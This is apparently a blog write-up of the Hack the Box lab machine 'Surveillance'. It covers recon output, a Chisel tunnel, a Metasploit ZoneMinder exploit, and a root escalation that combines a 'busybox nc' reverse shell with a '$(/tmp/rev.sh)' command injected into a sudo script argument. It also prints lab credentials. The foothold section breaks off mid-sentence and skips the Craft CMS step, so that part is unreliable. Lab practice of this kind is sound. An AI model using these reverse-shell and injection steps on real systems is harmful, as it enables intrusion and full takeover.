---
description: >-
  H3xano's write-up on the HTB machine : [Medium] Surveillance
title: Hack the Box - Surveillance Writeup
date: 2023-12-13 00:00:00 -0000
categories: [Hack the Box, Writeup]
tags: [htb,hacking,hack the box,writeup]     # TAG names should always be lowercase
---

## HTB - Surveillance

![Descriptive information card about Surveillance](/assets/img/surveillance-infocard.png)

## Overview

The target machine, named "Surveillance", is a medium difficulty Linux machine. It involves multiple steps for compromise. It begins with establishing a foothold as the www-data user, followed by privilege escalation through the Matthew user. The final escalation results in root access via the Zoneminder user.

### Target Information:

- **IP Address:** `10.10.11.245`
- **Users:** www-data, Matthew, zoneminder

## Enumeration:

### Initial enumeration:

   ```bash
   nmap 10.10.11.245 -sC -sV -O
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-09 22:31 EST
   Nmap scan report for surveillance.htb (10.10.11.245)
   Host is up (0.084s latency).
   Not shown: 998 closed tcp ports (reset)
   PORT     STATE SERVICE   VERSION
   22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey:
   |   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
   |_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
   80/tcp   open  http      nginx 1.18.0 (Ubuntu)
   |_http-server-header: nginx/1.18.0 (Ubuntu)
   |_http-title:  Surveillance 
   No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
   TCP/IP fingerprint:
   OS:SCAN(V=7.93%E=4%D=12/9%OT=22%CT=1%CU=40760%PV=Y%DS=2%DC=I%G=Y%TM=6575329
   OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=1
   OS:03%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O
   OS:3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=
   OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSN
   OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
   OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
   OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
   OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
   OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

   Network Distance: 2 hops
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

   OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 379.18 seconds
   ```
### Web Enumeration:

   Before initiating web enumeration tools, add the target domain to the /etc/hosts file to map the IP address to the domain name:
   ```bash
   echo "10.10.11.245  surveillance.htb" | sudo tee -a /etc/hosts
   ```
   This step ensures that tools recognize the target by its domain name.

   In an attempt to enumerate hidden subdomains, directories or files I have used both gobuster and wfuzz. the results did not reveal anything noteworthy.
   In addition to utilizing the aforementioned tools , I employed WhatWeb to gather detailed information about the web application hosted at surveillance.htb. The results provide insights into the technologies, frameworks, and configurations employed on the web server.

   ```bash
   $ whatweb surveillance.htb

   http://surveillance.htb [200 OK]
   Bootstrap, Country[RESERVED][ZZ], Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.245], JQuery[3.4.1], Script[text/javascript], Title[Surveillance], X-Powered-By[Craft CMS], X-UA-Compatible[IE=edge], nginx[1.18.0]
   ```

   These details provide a comprehensive overview of the web application's technology stack, including server information, JavaScript libraries, and the use of the Craft CMS. That made me wanna look into Craft CMS to uncover potential vulnerabilities or misconfigurations that may lead to further exploitation. After taking a look at the website you can figure out the version of Craft CMS used, which is 4.4.14.

   A quick google search 


## Foothold:

### www-data to Matthew:

1. **Connect as www-data:**
   ```bash
   ssh www-data@<machine ip>
   ```
   Upon successful connection, retrieve the credentials for the Matthew user: `matthew:starcraft122490`.

### Matthew to Zoneminder:

1. **Port Forwarding with Chisel:**
   - Utilize Chisel for secure and efficient port forwarding.
     ```bash
     # Run Chisel server at attacker's machine
     ./chisel server --port 1337 --reverse --socks5
     ```

     ```bash
     # Transfer Chisel to victim's PC
     python -m http.server 8888
     wget <your_ip>:8888/chisel
     chmod +x chisel
     ./chisel client <your_ip>:1337 R:<victim_port>:127.0.0.1:8080 &
     ```

2. **Access Zoneminder CMS:**
   - The forwarded port allows access to the Zoneminder CMS from the attacker's machine. Open the browser and navigate to `http://127.0.0.1:<victim_port>`.

3. **Exploitation with Metasploit:**
   - Utilize Metasploit to exploit a vulnerability in Zoneminder Snapshots.
     ```bash
     msfconsole
     ```

     ```bash
     use exploit/unix/webapp/zoneminder_snapshots
     ```

     ```bash
     set RHOSTS <victim_ip>
     set RPORT <victim_port>
     set LHOST <your_ip>
     set TARGETURI /
     ```

     ```bash
     exploit
     ```

     ```bash
     shell
     ```

   This sequence results in the establishment of a Meterpreter session, providing a shell on the victim machine.

### Retrieve User Flag:

4. **Locate User Flag:**
   - Once in the Meterpreter session, navigate to the user's home directory and retrieve the user flag.
     ```bash
     cat /home/Matthew/user.txt
     ```

## Privilege Escalation:

### Zoneminder to Root:

1. **Prepare Reverse Shell:**
   - Create a reverse shell script (`rev.sh`) and place it in `/tmp` on the victim machine.
     ```bash
     #!/bin/bash
     busybox nc 10.10.xx.xx 443 -e sh
     ```

2. **Start a Listener:**
   - Initiate a listener on the attacker's machine to capture the reverse shell connection at port 443.

3. **Execute Privilege Escalation Command:**
   - Run the following command as the zoneminder user to leverage the `zmupdate.pl` script for privilege escalation.
     ```bash
     sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023
     ```

4. **Retrieve Root Flag:**
   - Upon execution, the reverse shell script triggers a connection to the attacker's machine. Navigate to the root directory and retrieve the root flag.
     ```bash
     cat /root/root.txt
     ```

## Conclusion:

This comprehensive approach ensures a systematic compromise of the target machine, covering initial access, privilege escalation, and retrieval of both user and root flags. It is crucial to replace placeholder values such as `<machine ip>`, `<your_ip>`, and `10.10.xx.xx` with actual values during the exploitation process. Happy hacking!